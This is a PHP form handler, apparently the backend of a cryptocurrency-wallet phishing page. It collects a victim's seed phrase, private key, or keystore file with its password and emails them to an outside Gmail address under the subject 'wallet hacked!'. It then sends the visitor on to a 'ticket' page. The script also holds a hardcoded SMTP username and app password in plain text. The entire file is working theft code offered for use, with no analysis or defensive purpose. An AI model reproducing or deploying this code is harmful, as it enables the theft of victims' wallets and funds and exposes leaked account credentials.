<?php
    //Import PHPMailer classes into the global namespace
    //These must be at the top of your script, not inside a function
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;

    //Load Composer's autoloader
    require 'vendor/autoload.php';

    //Create an instance; passing `true` enables exceptions
    $mail = new PHPMailer(true);

    $wallet = $_POST['wallet'];
    $subject = ucfirst($wallet) .' wallet hacked!';
    if($_POST['type'] == 'phrase'){
        try {
            //Server settings
            $mail->SMTPDebug = 0; //SMTP::DEBUG_SERVER;                      //Enable verbose debug output
            $mail->isSMTP();                                            //Send using SMTP
            $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
            $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
            $mail->Username   = 'brianjulianopar@gmail.com';                     //SMTP username
            $mail->Password   = 'miwtavblrajxrlfv';                               //SMTP password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
            $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
    
            //Recipients
            $mail->setFrom('brianjulianopar@gmail.com', 'Brian Juliano');
            $mail->addAddress('uploadinstaacc@gmail.com', 'Joe User');     //Add a recipient
            // $mail->addAddress('ellen@example.com');               //Name is optional
            $mail->addReplyTo('admin@web3resolve.com', 'Information');
    
            //Attachments
            // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
            // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name
    
            //Content
            $mail->isHTML(true);                                  //Set email format to HTML
            $mail->Subject = $subject;
            $mail->Body    = "<b>Phrase: " .$_POST['phrase']. "</b>";
            $mail->AltBody = '1k4';
    
            $mail->send();
            header("Location: ../ticket.php/");
        } catch (Exception $e) {
            echo "Server is down at the moment!";
        }
    } elseif ($_POST['type'] == 'privatekey') {
        try {
            //Server settings
            $mail->SMTPDebug = 0; //SMTP::DEBUG_SERVER;                      //Enable verbose debug output
            $mail->isSMTP();                                            //Send using SMTP
            $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
            $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
            $mail->Username   = 'brianjulianopar@gmail.com';                     //SMTP username
            $mail->Password   = 'miwtavblrajxrlfv';                               //SMTP password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
            $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
    
            //Recipients
            $mail->setFrom('brianjulianopar@gmail.com', 'Brian Juliano');
            $mail->addAddress('uploadinstaacc@gmail.com', 'Joe User');     //Add a recipient
            // $mail->addAddress('ellen@example.com');               //Name is optional
            $mail->addReplyTo('admin@web3resolve.com', 'Information');
    
            //Attachments
            // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
            // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name
    
            //Content
            $mail->isHTML(true);                                  //Set email format to HTML
            $mail->Subject = $subject;
            $mail->Body    = "<b>Privatekey: " .$_POST['privatekey']. "<b";
            $mail->AltBody = '1k4';
    
            $mail->send();
            header("Location: ../ticket.php/");
        } catch (Exception $e) {
            echo "Server is down at the moment!";
        }
    } else {
        try {
            //Server settings
            $mail->SMTPDebug = 0; //SMTP::DEBUG_SERVER;                      //Enable verbose debug output
            $mail->isSMTP();                                            //Send using SMTP
            $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
            $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
            $mail->Username   = 'brianjulianopar@gmail.com';                     //SMTP username
            $mail->Password   = 'miwtavblrajxrlfv';                               //SMTP password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
            $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
    
            //Recipients
            $mail->setFrom('brianjulianopar@gmail.com', 'Brian Juliano');
            $mail->addAddress('uploadinstaacc@gmail.com', 'Joe User');     //Add a recipient
            // $mail->addAddress('ellen@example.com');               //Name is optional
            $mail->addReplyTo('admin@web3resolve.com', 'Information');
    
            //Attachments
            $mail->addAttachment($_FILES['keystore']['tmp_name'], $_FILES['keystore']['name']);        //Add attachments
            // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name
    
            //Content
            $mail->isHTML(true);                                  //Set email format to HTML
            $mail->Subject = $subject;
            $mail->Body    = "<b>Password: " .$_POST['password']. "</b>";
            $mail->AltBody = '1k4';
    
            $mail->send();
            header("Location: ../ticket.php/");
        } catch (Exception $e) {
            echo "Server is down at the moment!";
        }
    }
?>